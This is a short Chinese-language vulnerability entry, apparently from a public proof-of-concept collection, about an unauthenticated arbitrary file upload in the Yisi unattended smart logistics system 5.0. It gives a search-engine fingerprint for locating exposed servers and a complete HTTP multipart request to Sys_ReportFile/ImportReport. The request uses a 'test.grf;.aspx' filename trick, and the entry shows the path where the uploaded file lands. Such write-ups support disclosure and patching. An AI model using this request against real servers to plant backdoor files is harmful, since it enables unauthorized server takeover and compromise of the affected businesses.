# 易思智能物流无人值守系统ImportReport任意文件上传漏洞

# 一、漏洞简介
易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇。Sys_ReportFile/ImportReport接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 易思智能物流无人值守系统5.0

# 三、资产测绘
+ hunter`web.body=="易思无人值守智能物流"`
+ 登录页面


# 四、漏洞复现
```plain
POST /Sys_ReportFile/ImportReport?encode=b HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 130
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.grf;.aspx"

test
--00content0boundary00--
```

---


上传文件位置

```plain
http://xx.xx.xx.xx/GRF/Custom/b.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uklfg9x4h2md4vgi>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
